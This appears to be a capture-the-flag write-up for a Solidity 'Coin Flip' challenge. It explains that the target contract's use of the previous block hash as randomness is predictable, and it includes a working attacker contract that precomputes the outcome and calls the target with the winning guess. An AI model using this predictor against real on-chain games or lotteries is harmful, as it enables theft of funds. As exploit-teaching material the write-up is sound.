# 03. Coin Flip

To win this challenge we must guess correctly the outcome of a coin flip 10 times in a row.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

## Vulnerability

This contract uses block hash as a source of entropy. This is a very bad practice as any user or miner can take advantage
of the contract false randomness to gain an advantage.

This can be done either from JavaScript or Solidity.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address myContract;

  constructor (address _myContract) {
      myContract = _myContract;
  }
  
  function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number -1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    
    (bool success, bytes memory rvalue) = myContract.call(abi.encodeWithSignature("flip(bool)", side));
    
    if (success == false) {
        revert("Call did not succeed");
    }
    
    return abi.decode(rvalue, (bool));
    
  }
}
```

Calling the flip function on the previous contract will issue a call to the target contract with the correct outcome as a guess.
All there is to do is to call it ten times in a row and win the challenge !

You can do so either from Javascript or directly from your browser using Remix for example.
